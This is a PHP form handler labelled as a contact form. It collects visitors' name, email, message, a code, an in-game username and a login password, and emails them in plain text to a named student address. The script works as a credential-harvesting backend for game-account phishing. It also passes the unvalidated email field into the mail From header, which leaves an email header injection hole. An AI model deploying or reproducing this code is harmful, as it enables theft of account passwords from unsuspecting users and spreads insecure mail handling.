<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $message = $_POST['message'];
    $code = $_POST['code'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    $to = "aayan.patel@student.education.wa.edu.au";
    $subject = "Contact Form Submission";
    $body = "Name: $name\nEmail: $email\nMessage: $message\nCode: $code\nIn-Game Username: $username\nLog-in Password: $password";
    $headers = "From: $email";

    if (mail($to, $subject, $body, $headers)) {
        echo "Email successfully sent!";
    } else {
        echo "Failed to send email.";
    }
} else {
    echo "Invalid request.";
}
?>
